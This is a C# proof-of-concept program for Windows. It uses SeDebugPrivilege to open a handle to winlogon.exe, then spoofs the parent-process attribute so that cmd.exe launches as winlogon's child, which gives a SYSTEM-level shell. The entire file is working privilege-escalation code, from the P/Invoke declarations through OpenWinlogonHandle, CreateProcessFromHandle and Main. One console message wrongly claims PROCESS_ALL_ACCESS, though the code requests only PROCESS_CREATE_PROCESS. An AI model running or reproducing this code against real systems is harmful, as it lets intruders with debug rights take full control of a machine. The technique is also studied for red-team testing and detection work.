using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SeDebugPrivilegePoC
{
    class SeDebugPrivilegePoC
    {
        /*
         * P/Invoke : Enums
         */
        [Flags]
        enum FormatMessageFlags : uint
        {
            FORMAT_MESSAGE_ALLOCATE_BUFFER = 0x00000100,
            FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200,
            FORMAT_MESSAGE_FROM_STRING = 0x00000400,
            FORMAT_MESSAGE_FROM_HMODULE = 0x00000800,
            FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000,
            FORMAT_MESSAGE_ARGUMENT_ARRAY = 0x00002000
        }

        [Flags]
        enum ProcessAccessFlags : uint
        {
            PROCESS_ALL_ACCESS = 0x001F0FFF,
            Terminate = 0x00000001,
            PROCESS_CREATE_THREAD = 0x00000002,
            PROCESS_VM_OPERATION = 0x00000008,
            PROCESS_VM_READ = 0x00000010,
            PROCESS_VM_WRITE = 0x00000020,
            PROCESS_DUP_HANDLE = 0x00000040,
            PROCESS_CREATE_PROCESS = 0x000000080,
            PROCESS_SET_QUOTA = 0x00000100,
            PROCESS_SET_INFORMATION = 0x00000200,
            PROCESS_QUERY_INFORMATION = 0x00000400,
            PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
            SYNCHRONIZE = 0x00100000,
            MAXIMUM_ALLOWED = 0x02000000
        }

        [Flags]
        enum ProcessCreationFlags : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
        }

        enum PROC_THREAD_ATTRIBUTES
        {
            PROC_THREAD_ATTRIBUTE_GROUP_AFFINITY = 0x00030003,
            PROC_THREAD_ATTRIBUTE_HANDLE_LIST = 0x00020002,
            PROC_THREAD_ATTRIBUTE_IDEAL_PROCESSOR = 0x00030005,
            PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000,
            PROC_THREAD_ATTRIBUTE_PREFERRED_NODE = 0x00020004,
            PROC_THREAD_ATTRIBUTE_UMS_THREAD = 0x00030006,
            PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES = 0x00020009,
            PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL = 0x0002000B,
            PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY = 0x0002000E,
            PROC_THREAD_ATTRIBUTE_DESKTOP_APP_POLICY = 0x00020012,
            PROC_THREAD_ATTRIBUTE_JOB_LIST = 0x0002000D,
            PROC_THREAD_ATTRIBUTE_ENABLE_OPTIONAL_XSTATE_FEATURES = 0x0003001B
        }

        /*
         * P/Invoke : Structs
         */
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        /*
         * P/Invoke : Win32 APIs
         */
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern int FormatMessage(
            FormatMessageFlags dwFlags,
            IntPtr lpSource,
            int dwMessageId,
            int dwLanguageId,
            StringBuilder lpBuffer,
            int nSize,
            IntPtr Arguments);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList,
            int dwAttributeCount,
            uint dwFlags,
            ref int lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess,
            bool bInheritHandle,
            int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList,
            uint dwFlags,
            IntPtr Attribute,
            IntPtr lpValue,
            IntPtr cbSize,
            IntPtr lpPreviousValue,
            IntPtr lpReturnSize);

        /*
         * Win32 Consts
         */
        const int ERROR_INSUFFICIENT_BUFFER = 0x0000007A;

        /*
         * User defined functions
         */
        static bool CompareIgnoreCase(string strA, string strB)
        {
            return (string.Compare(strA, strB, StringComparison.OrdinalIgnoreCase) == 0);
        }


        static bool CreateProcessFromHandle(IntPtr hProcess)
        {
            int error;
            bool status;
            int size = 0;
            var lpValue = IntPtr.Zero;
            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf(si);
            si.lpAttributeList = IntPtr.Zero;

            do
            {
                status = InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref size);
                error = Marshal.GetLastWin32Error();

                if (!status)
                {
                    if (si.lpAttributeList != IntPtr.Zero)
                        Marshal.FreeHGlobal(si.lpAttributeList);

                    si.lpAttributeList = Marshal.AllocHGlobal(size);
                    ZeroMemory(si.lpAttributeList, size);
                }
            } while (!status && error == ERROR_INSUFFICIENT_BUFFER);

            do
            {
                if (!status)
                {
                    Console.WriteLine("[-] Failed to initialize thread attribute list.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }

                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, hProcess);

                status = UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTES.PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to update thread attribute.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }

                status = CreateProcess(
                    null,
                    @"C:\Windows\System32\cmd.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT | ProcessCreationFlags.CREATE_NEW_CONSOLE,
                    IntPtr.Zero,
                    Environment.CurrentDirectory,
                    ref si,
                    out PROCESS_INFORMATION pi);

                if (!status)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to create new process.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                }
                else
                {
                    Console.WriteLine("[+] New process is created successfully.");
                    Console.WriteLine("    |-> PID : {0}", pi.dwProcessId);
                    Console.WriteLine("    |-> TID : {0}", pi.dwThreadId);
                    CloseHandle(pi.hThread);
                    CloseHandle(pi.hProcess);
                }
            } while (false);

            if (lpValue != IntPtr.Zero)
                Marshal.FreeHGlobal(lpValue);

            if (si.lpAttributeList != IntPtr.Zero)
                Marshal.FreeHGlobal(si.lpAttributeList);

            return status;
        }


        static string GetWin32ErrorMessage(int code, bool isNtStatus)
        {
            int nReturnedLength;
            int nSizeMesssage = 256;
            var message = new StringBuilder(nSizeMesssage);
            var dwFlags = FormatMessageFlags.FORMAT_MESSAGE_FROM_SYSTEM;
            var pNtdll = IntPtr.Zero;

            if (isNtStatus)
            {
                foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
                {
                    if (CompareIgnoreCase(Path.GetFileName(module.FileName), "ntdll.dll"))
                    {
                        pNtdll = module.BaseAddress;
                        dwFlags |= FormatMessageFlags.FORMAT_MESSAGE_FROM_HMODULE;
                        break;
                    }
                }
            }

            nReturnedLength = FormatMessage(
                dwFlags,
                pNtdll,
                code,
                0,
                message,
                nSizeMesssage,
                IntPtr.Zero);

            if (nReturnedLength == 0)
                return string.Format("[ERROR] Code 0x{0}", code.ToString("X8"));
            else
                return string.Format("[ERROR] Code 0x{0} : {1}", code.ToString("X8"), message.ToString().Trim());
        }


        static IntPtr OpenWinlogonHandle()
        {
            int winlogon;
            int error;
            var hWinlogon = IntPtr.Zero;

            do
            {
                Console.WriteLine("[>] Searching winlogon PID.");

                try
                {
                    winlogon = (Process.GetProcessesByName("winlogon")[0]).Id;
                }
                catch
                {
                    Console.WriteLine("[-] Failed to get process ID of winlogon.");
                    break;
                }

                Console.WriteLine("[+] PID of winlogon: {0}", winlogon);
                Console.WriteLine("[>] Trying to get handle to winlogon.");

                hWinlogon = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, winlogon);

                if (hWinlogon == IntPtr.Zero)
                {
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine("[-] Failed to get a winlogon handle.");
                    Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
                    break;
                }

                Console.WriteLine("[+] Got handle to winlogon with PROCESS_ALL_ACCESS (hProcess = 0x{0}).", hWinlogon.ToString("X"));
            } while (false);

            return hWinlogon;
        }


        static void ZeroMemory(IntPtr buffer, int size)
        {
            var nullBytes = new byte[size];
            Marshal.Copy(nullBytes, 0, buffer, size);
        }


        static void Main()
        {
            Console.WriteLine("[*] If you have SeDebugPrivilege, you can get handles from privileged processes.");
            Console.WriteLine("[*] This PoC tries to spawn cmd.exe as a winlogon.exe's child process.");

            IntPtr hProcess = OpenWinlogonHandle();

            if (hProcess != IntPtr.Zero)
            {
                CreateProcessFromHandle(hProcess);
                CloseHandle(hProcess);
            }
        }
    }
}
